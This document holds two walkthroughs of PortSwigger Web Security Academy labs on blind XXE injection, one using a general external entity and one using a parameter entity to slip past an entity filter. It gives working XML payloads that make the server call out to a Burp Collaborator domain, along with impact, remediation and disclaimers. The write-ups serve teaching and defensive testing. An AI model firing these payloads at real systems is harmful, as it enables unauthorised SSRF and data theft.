# XXE Injection: Blind XXE with Out-of-Band Interaction

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Blind XML External Entity Injection (CWE-611)

## Lab Objective
The "Check stock" feature parses XML input but never reflects the result back in the response. Detect and confirm the resulting blind XXE vulnerability by forcing the XML parser to issue a DNS lookup and HTTP request to an attacker-controlled Burp Collaborator domain.

## Vulnerability Overview
Every prior lab in this series relied on **in-band** XXE: the application reflected the resolved entity's value somewhere in the response, so the exploit and the proof of success were the same request. Blind XXE removes that feedback loop — the parser still processes the malicious entity server-side, but no visible trace of the result ever reaches the attacker directly.

This doesn't make the vulnerability unexploitable; it changes the exploitation technique from "read the response" to **out-of-band (OOB) interaction**. Because the `SYSTEM` identifier can reference any URI the parser's HTTP client can reach — not just local files — an attacker can point it at infrastructure they control instead. If the server resolves the hostname and makes a request to it, that interaction itself (a DNS lookup, followed by an HTTP request) is proof the XXE fired, even though no data ever came back in the HTTP response the attacker sees directly.

Burp Suite's **Collaborator** is purpose-built for this: it generates a unique, disposable domain, logs every DNS and HTTP interaction made against it, and lets the attacker correlate "I sent this payload" with "and here's proof it executed," entirely out of band from the original request/response cycle.

## Methodology
1. **Identify the XML-consuming feature**, as in prior labs — the "Check stock" request submits raw XML.
2. **Recognize the absence of reflection.** Unlike the first lab in this series, no part of the submitted XML is echoed back, ruling out simple in-band exploitation.
3. **Generate a unique Collaborator payload** via Burp's built-in client — this provides a fresh, attacker-controlled hostname to target.
4. **Inject an external entity pointing at that hostname**, with no need to reference it anywhere in the response, since the goal is just to trigger the outbound request.
5. **Poll the Collaborator client** for interactions, confirming the DNS/HTTP callback actually arrived.

---

## Exploitation

**Step 1:** Add a product to the cart and click "Check stock." Intercept the request in Burp Suite — raw XML, as in earlier labs:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Step 2:** Send the request to **Repeater**. Confirm the response contains only a normal stock value with no reflection of input — establishing this as a blind scenario before attempting anything further.

**Step 3:** Open **Burp > Collaborator client** (via the Burp menu) and click **Copy to clipboard** to generate a unique Collaborator payload — a domain such as:

```
a1b2c3d4e5f6g7h8i9j0.oastify.com
```

**Step 4:** Replace the request body with a payload defining an external entity pointing at the Collaborator domain. Note the entity doesn't need to be referenced inside any reflected field this time, since no reflection exists to exploit — the mere act of the parser resolving the `DOCTYPE` is sufficient:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://a1b2c3d4e5f6g7h8i9j0.oastify.com/">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Step 5:** Send the request. The application's response looks unremarkable — just the normal stock output — giving no indication anything happened.

**Step 6:** Return to the **Collaborator client** and click **Poll now**. The log now shows one or more interactions: a **DNS** lookup for the generated subdomain, followed by an **HTTP** request to it — both originating from the lab's server.

**Step 7:** The presence of these interactions confirms the parser resolved the malicious `SYSTEM` entity and reached out to external, attacker-controlled infrastructure, which is sufficient to solve the lab.

**Why it works:** The parser's vulnerability (DTD and external entity processing enabled) is identical to the in-band labs — what's different is purely the detection and proof mechanism. Since the application gives no visible feedback, the attacker can't rely on reading a response; instead, they rely on the fact that DNS resolution and the subsequent HTTP request are themselves side effects that occur entirely outside the application's response — on infrastructure designed specifically to observe exactly this kind of blind interaction.

## Impact
- **Confirms exploitability even with zero reflected output** — many real-world XXE vulnerabilities are blind by default, since most applications don't deliberately echo parsed XML fields back to the user; OOB techniques are often the *only* viable detection method in production environments.
- **Proves SSRF capability independent of data exfiltration** — even without extracting data, confirmed OOB interaction demonstrates the server can be forced to make arbitrary outbound requests, which has standalone value for network reconnaissance and further SSRF-style attacks against internal infrastructure.
- **Foundation for further blind XXE escalation** — confirmed blind XXE is typically the first step toward more advanced techniques (parameter entities, malicious external DTDs, error-based exfiltration) covered in the remaining labs of this series, which build on this same OOB channel to actually extract data rather than just confirm the vulnerability exists.

## Remediation
- **Disable DTD processing and external entity resolution** in the XML parser — identical to the fix for in-band XXE, since the underlying misconfiguration is the same; blind XXE is not a distinct vulnerability class requiring a separate fix, only a separate detection method.
- **Restrict outbound network access from the application server** at the network/firewall level, so that even if an XXE/SSRF-capable flaw exists, the server cannot reach arbitrary external (or internal) hosts.
- **Monitor DNS and outbound HTTP logs for anomalous destinations** — unexplained lookups to unfamiliar, randomly-generated domains are a strong indicator of active OOB exploitation attempts and should be alerted on.
- **Treat "no visible reflection" as inconclusive, not safe, during security testing** — this lab is a direct demonstration of why XML-accepting endpoints must always be tested with OOB techniques, not just by checking whether input appears in the response.

## Key Takeaways
- Blind vulnerabilities are not unexploitable vulnerabilities — they require a shift in technique (out-of-band channels) rather than being written off as low-risk due to lack of visible output.
- Burp Collaborator effectively turns "does this request have any observable effect?" into an answerable question for any interaction type that produces network traffic — DNS, HTTP, or SMTP.
- The entity reference doesn't need to be placed inside a reflected output field for a blind OOB attack — simply having it exist within the `DOCTYPE` is enough to trigger resolution, since the parser processes the entity definition regardless of whether its value is ever displayed.
- This lab is the gateway to the more advanced blind XXE techniques later in the learning path — understanding *why* OOB confirmation works here is prerequisite knowledge for the out-of-band data exfiltration labs that follow.

## Tools Used
- Burp Suite (Proxy, Repeater, Collaborator client)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.


## AFTER(2nd lab which demonstrates the same vulnerability but with XML parsing entities.)

# XXE Injection: Blind XXE with Out-of-Band Interaction via XML Parameter Entities

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Blind XML External Entity Injection, Parameter-Entity Bypass (CWE-611)

## Lab Objective
The "Check stock" feature parses XML input, never displays the result, and now actively **blocks requests containing regular external entities**. Bypass that filter using an XML **parameter entity** instead, forcing the parser to issue a DNS lookup and HTTP request to Burp Collaborator.

## Vulnerability Overview
This lab builds directly on the previous blind XXE lab, but adds a defensive measure: the application now detects and rejects regular external entity declarations — i.e. anything matching the familiar `<!ENTITY name SYSTEM "...">` pattern used so far throughout this series. A naive assumption would be that this filter closes off XXE entirely. It doesn't, because **XML parameter entities are a structurally distinct construct**, and a filter written to catch one does not automatically catch the other.

Two details distinguish parameter entities from the general entities used previously:
- **Scope:** a parameter entity can only be referenced *within the DTD itself*, not in the document body — but for a blind, non-data-exfiltrating OOB ping, that's irrelevant, since the goal is simply to trigger resolution, not display a value.
- **Syntax:** parameter entities are declared with a `%` immediately after `<!ENTITY`, and referenced using `%name;` instead of the usual `&name;`.

```xml
<!ENTITY % xxe SYSTEM "http://collaborator-domain/">
%xxe;
```

If the application's filter was written as a naive pattern match against `<!ENTITY` declarations expecting the ampersand-reference form, or only inspects entities referenced in the document body, the `%`-prefixed declaration and its in-DTD reference can slip through entirely unnoticed, while still being fully valid, resolvable XML.

## Methodology
1. **Confirm the filter's existence.** Resend the exact payload that worked in the previous blind XXE lab and observe the application now returns an explicit rejection (e.g. "Entities are not allowed for security reasons") instead of processing it.
2. **Reason about what the filter is actually matching.** A filter blocking "regular" external entities is a strong hint to try the structurally different parameter-entity form instead.
3. **Construct a parameter-entity payload**, declaring it with `%` and referencing it immediately within the same `DOCTYPE`, rather than inside the document body.
4. **Generate a fresh Collaborator payload** and inject it as the entity's `SYSTEM` target.
5. **Poll Collaborator** to confirm the DNS/HTTP interaction fired, proving the filter was bypassed.

---

## Exploitation

**Step 1:** Add a product to the cart and click "Check stock." Intercept the request in Burp Suite:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Step 2:** Send the request to **Repeater** and first confirm the filter is active by resubmitting the prior lab's regular-entity payload:

```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://collaborator-domain/" > ]>
```

The response explicitly rejects it, confirming entity-based filtering is now in place.

**Step 3:** Generate a fresh payload in **Burp > Collaborator client**, then replace the request body with a parameter-entity-based `DOCTYPE`. The parameter entity is declared and immediately referenced within the DTD itself — no reference is needed anywhere in the document body:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://a1b2c3d4e5f6g7h8i9j0.oastify.com">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Step 4:** Send the request. The application's filter, apparently only inspecting for the standard `&name;`-style entity pattern, does not flag this payload, and the response again looks like an ordinary, unremarkable stock response.

**Step 5:** Return to the **Collaborator client** and click **Poll now**. The log shows a DNS lookup followed by an HTTP request originating from the lab's server, confirming the parser resolved the parameter entity's `SYSTEM` URI.

**Step 6:** This confirmed OOB interaction is sufficient to solve the lab.

**Why it works:** The vulnerability is unchanged from the prior lab — the parser still resolves external entities. What's new is a defensive filter, and defensive filters that pattern-match on syntax rather than on the underlying XML entity *mechanism* are inherently incomplete. By declaring the entity with `%` and referencing it inside the DTD rather than the document body, the payload avoids whatever specific pattern the filter was built to catch, while remaining fully valid XML that the parser processes exactly as intended — the filter's blind spot is the vulnerability here, layered directly on top of the original one.

## Impact
- **Filter bypass demonstrates insufficient input validation as a standalone XXE defense** — blocking "obvious" entity syntax without disabling the underlying parser feature leaves a structurally equivalent bypass available.
- **Confirms the XXE primitive remains fully exploitable** despite apparent hardening — an attacker observing a rejected payload should treat that as a prompt to try alternate entity syntax, not as proof the application is safe.
- **Sets up further data exfiltration techniques** — parameter entities are also the mechanism used in the more advanced labs in this series (malicious external DTDs, error-based exfiltration) to actually extract file contents via OOB channels, not just confirm the vulnerability as done here.

## Remediation
- **Disable DTD processing and external entity resolution at the parser configuration level**, not via input filtering. This is the only fix that closes off both regular *and* parameter entity vectors simultaneously, since it removes the capability rather than attempting to pattern-match every syntactic variant of it.
- **Never rely on blocklisting specific entity syntax as a primary defense.** As demonstrated here, a filter targeting one valid XML construct (general entities) can be trivially sidestepped by an equally valid, differently-structured construct (parameter entities) that achieves the same outcome.
- **Validate XML against a strict, pre-defined schema** that doesn't permit `DOCTYPE` declarations at all for inputs that don't require them — a schema-based allowlist approach is categorically stronger than entity-pattern blocklisting.
- **Audit any existing "XXE protection" for exactly this gap** — if a codebase has a custom filter rather than a hardened parser configuration, it should be assumed incomplete until proven to block parameter entities, CDATA-based tricks, and other entity variants as well.

## Key Takeaways
- Input filtering is not a substitute for disabling the vulnerable parser feature — this lab is a direct, practical demonstration of that principle, not just a textbook warning.
- Parameter entities (`%name;`) and general entities (`&name;`) are distinct XML constructs with different scoping rules, and a defense built around one does not automatically cover the other.
- When a straightforward payload is explicitly rejected, the next step in a real assessment is to vary the *technique*, not assume the vulnerability is actually fixed — a rejection message is information, not a dead end.
- This lab is also the first to use a parameter entity purely for triggering OOB interaction rather than for the more advanced out-of-band DTD/exfiltration techniques — understanding this simpler case first is what makes the subsequent, more complex exfiltration labs tractable.

## Tools Used
- Burp Suite (Proxy, Repeater, Collaborator client)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.
